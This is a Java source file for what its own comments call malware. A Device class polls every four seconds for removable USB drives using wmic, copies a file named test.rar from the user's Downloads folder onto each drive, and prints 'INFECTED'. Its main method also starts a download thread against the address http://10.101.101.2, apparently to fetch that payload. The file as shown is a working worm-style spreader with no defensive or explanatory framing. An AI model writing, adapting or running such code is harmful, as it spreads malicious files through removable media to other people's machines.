import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class Device implements Runnable {

	int waitTime = 4; // en sec

	public static void main(String args[]) {
		new Thread(new Download("http://10.101.101.2", 5)).start();
		//new Thread(new Download("https://api.ipify.org/?format=json", 5)).start();
		new Thread(new Device()).start();
	}

	/**
	 * Sleep for waitTime seconds then get USB device and infect them
	 */
	@Override
	public void run() {
		while(true) {
			try {
				Thread.sleep(waitTime * 1000);
				List<String> devices = getDevices();
				for (String d: devices)
					infect(d);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}		
	}
	/**
	 * @param device string identifying a device
	 * Copy a malicious file to the device
	 */
	public void infect(String device) {
		try {
			String username = new BufferedReader(new InputStreamReader(
					Runtime.getRuntime().exec("cmd.exe /c echo %username%").getInputStream()
					)).readLine();
			Runtime.getRuntime().exec("cmd.exe /c copy C:\\Users\\"+username+"\\Downloads\\test.rar " + device);
			System.out.println("INFECTED : " + device);
		} catch (Exception e) {e.printStackTrace();}
	}

	/**
	 * Use windows wmic built-in to retrieve connected USB drives
	 * @return List<String> of devices's identifiers
	 */
	public List<String> getDevices() {
		List<String> lines = new ArrayList<>();

		try {
			BufferedReader r = new BufferedReader(new InputStreamReader(
					Runtime.getRuntime()
					.exec("cmd.exe /c wmic logicaldisk where drivetype=2 get deviceid")
					//.exec("cmd.exe /c dir") // For DEBUG
					.getInputStream()));
			String line;
			while ((line = r.readLine()) != null) {
				// System.out.println(line); // For DEBUG
				if (line.contains(":"))
					lines.add(line);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return lines;
	}
}

